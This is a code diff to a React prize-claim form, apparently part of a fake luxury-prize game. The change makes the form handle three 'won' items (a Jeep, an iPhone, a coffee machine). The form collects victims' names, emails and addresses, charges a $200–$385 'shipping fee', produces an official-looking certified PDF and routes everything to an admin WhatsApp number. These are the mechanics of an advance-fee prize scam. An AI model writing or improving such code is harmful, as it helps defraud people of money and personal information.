@@ -2,20 +2,20 @@
 
 import React, { useState } from "react";
 import { motion } from "framer-motion";
-import { Download, MessageSquare, CheckCircle2, ShieldAlert, User, Mail, MapPin, Lock, Sparkles, Truck, AlertTriangle } from "lucide-react";
+import { Download, MessageSquare, CheckCircle2, ShieldAlert, User, Mail, MapPin, Lock, Sparkles, Truck, Gift } from "lucide-react";
 import { jsPDF } from "jspdf";
 import { LuxuryItem } from "./BoxGridGame";
 import { useLanguage } from "@/context/LanguageContext";
 
 interface ClaimFormProps {
   winningPrize: number;
-  winningItem?: LuxuryItem;
+  winningItems?: LuxuryItem[];
 }
 
 // Admin WhatsApp Number
 const ADMIN_WHATSAPP_NUMBER = "22990000000";
 
-export default function ClaimForm({ winningPrize, winningItem }: ClaimFormProps) {
+export default function ClaimForm({ winningPrize, winningItems = [] }: ClaimFormProps) {
   const [nom, setNom] = useState("");
   const [email, setEmail] = useState("");
   const [adresse, setAdresse] = useState("");
@@ -26,8 +26,9 @@ export default function ClaimForm({ winningPrize, winningItem }: ClaimFormProps)
 
   const { t } = useLanguage();
 
-  // Dynamic shipping fee based on item won (between $200 and $385 USD)
-  const shippingFee = winningItem ? winningItem.shippingFee : 250;
+  // Dynamic shipping fee calculated for the 3 items bundle (between $200 and $385 USD)
+  const maxFee = winningItems.length > 0 ? Math.max(...winningItems.map((i) => i.shippingFee)) : 350;
+  const shippingFee = maxFee;
 
   const handleFormSubmit = (e: React.FormEvent) => {
     e.preventDefault();
@@ -68,7 +69,9 @@ export default function ClaimForm({ winningPrize, winningItem }: ClaimFormProps)
       minute: "2-digit",
     });
 
-    const itemName = winningItem ? `${winningItem.name} (${winningItem.valueEst})` : "iPhone 16 Pro Max 1TB ($1,599)";
+    const itemsText = winningItems.length > 0 
+      ? winningItems.map((item, idx) => `${idx + 1}. ${item.name} (${item.valueEst})`).join(" | ")
+      : "1. Jeep Renegade SUV 4x4 | 2. iPhone 16 Pro Max 1TB | 3. Machine à Café Smeg";
 
     // Dark luxury theme colors
     doc.setFillColor(15, 23, 42); // slate 900 background header
@@ -132,7 +135,7 @@ export default function ClaimForm({ winningPrize, winningItem }: ClaimFormProps)
       [t("pdfRowNom"), nom],
       [t("pdfRowEmail"), email],
       [t("pdfRowAdresse"), adresse],
-      [t("pdfRowItem"), itemName],
+      [t("pdfRowItem"), itemsText],
       [t("pdfRowShipping"), `$ ${shippingFee} USD (ENGAGEMENT VALIDE)`],
       [t("pdfRowStatus"), t("pdfStatusValue")],
     ];
@@ -149,7 +152,7 @@ export default function ClaimForm({ winningPrize, winningItem }: ClaimFormProps)
       doc.text(splitVal, 88, startY);
 
       doc.setFont("helvetica", "normal");
-      startY += (splitVal.length * 6) + 2.5;
+      startY += (splitVal.length * 5.5) + 2.5;
     });
 
     // Winning Prize Box
@@ -162,9 +165,9 @@ export default function ClaimForm({ winningPrize, winningItem }: ClaimFormProps)
     doc.setFont("helvetica", "bold");
     doc.text(t("pdfNetTotalLabel"), 105, startY + 14, { align: "center" });
 
-    doc.setFontSize(17);
+    doc.setFontSize(16);
     doc.setTextColor(22, 163, 74);
-    doc.text(`$ ${winningPrize.toLocaleString("en-US")} USD  +  ${winningItem?.name || "iPhone 16 Pro Max"}`, 105, startY + 26, { align: "center" });
+    doc.text(`$ ${winningPrize.toLocaleString("en-US")} USD  +  3 CADEAUX DE LUXE`, 105, startY + 26, { align: "center" });
 
     // Official Certification Stamp
     doc.setDrawColor(22, 163, 74);
@@ -189,13 +192,16 @@ export default function ClaimForm({ winningPrize, winningItem }: ClaimFormProps)
   };
 
   const getWhatsAppLink = () => {
-    const itemStr = winningItem ? winningItem.name : "Cadeau de Luxe";
-    const message = `${t("waMessageHello")} ${winningPrize.toLocaleString("en-US")} $ + ${itemStr} ${t("waMessageOnSite")}
+    const itemsListStr = winningItems.length > 0 
+      ? winningItems.map((i, idx) => `${idx + 1}. ${i.name}`).join(" | ")
+      : "3 Cadeaux de Luxe";
+
+    const message = `${t("waMessageHello")} ${winningPrize.toLocaleString("en-US")} $ + ${itemsListStr} ${t("waMessageOnSite")}
 
 ${t("waName")} ${nom}
 ${t("waEmail")} ${email}
 ${t("waAddress")} ${adresse}
-${t("waItem")} ${itemStr}
+${t("waItem")} ${itemsListStr}
 ${t("waShippingFee")} $ ${shippingFee} USD
 ${t("waRef")} ${transactionId}
 
@@ -215,27 +221,33 @@ ${t("waClosing", { fee: shippingFee })}`;
             {t("claimBadge")}
           </div>
 
-          {winningItem && (
-            <div className="mb-6 p-3 rounded-2xl bg-brandDark-800/90 border border-yellow-500/40 flex items-center justify-between gap-3 text-left">
-              <div className="flex items-center gap-3">
-                <img
-                  src={winningItem.image}
-                  alt={winningItem.name}
-                  className="w-14 h-14 object-cover rounded-xl border border-yellow-400 shrink-0 shadow-md"
-                />
-                <div>
-                  <span className="text-[10px] text-yellow-400 font-bold uppercase tracking-wider block">
-                    🎁 {t("winningModalItemLabel")}
-                  </span>
-                  <span className="text-sm font-black text-white block">
-                    {winningItem.name} ({winningItem.valueEst})
-                  </span>
-                </div>
+          {/* 3 Items Preview Banner */}
+          {winningItems.length > 0 && (
+            <div className="mb-6 p-4 rounded-2xl bg-brandDark-800/90 border border-yellow-500/40 space-y-3 text-left">
+              <div className="flex items-center justify-between">
+                <span className="text-xs text-yellow-400 font-bold uppercase tracking-wider flex items-center gap-1.5">
+                  <Gift className="w-4 h-4 text-yellow-400" />
+                  3 LOTS DE LUXE EN ATTENTE DE LIVRAISON :
+                </span>
+                <span className="text-xs font-black text-yellow-300 bg-yellow-500/10 px-2.5 py-0.5 rounded-full border border-yellow-500/30">
+                  Frais: ${shippingFee} USD
+                </span>
               </div>
 
-              <div className="text-right shrink-0 bg-yellow-500/10 border border-yellow-500/30 px-2.5 py-1 rounded-xl">
-                <span className="text-[9px] text-gray-400 uppercase font-bold block">Expédition</span>
-                <span className="text-xs font-black text-yellow-300">${shippingFee} USD</span>
+              <div className="grid grid-cols-1 sm:grid-cols-3 gap-2">
+                {winningItems.map((item, idx) => (
+                  <div key={idx} className="flex items-center gap-2 bg-brandDark-900/80 p-2 rounded-xl border border-gray-800">
+                    <img
+                      src={item.image}
+                      alt={item.name}
+                      className="w-10 h-10 object-cover rounded-lg border border-yellow-400 shrink-0"
+                    />
+                    <div className="truncate">
+                      <span className="text-[11px] font-black text-white block truncate">{item.name}</span>
+                      <span className="text-[9px] text-green-400 font-bold block">{item.valueEst}</span>
+                    </div>
+                  </div>
+                ))}
               </div>
             </div>
           )}
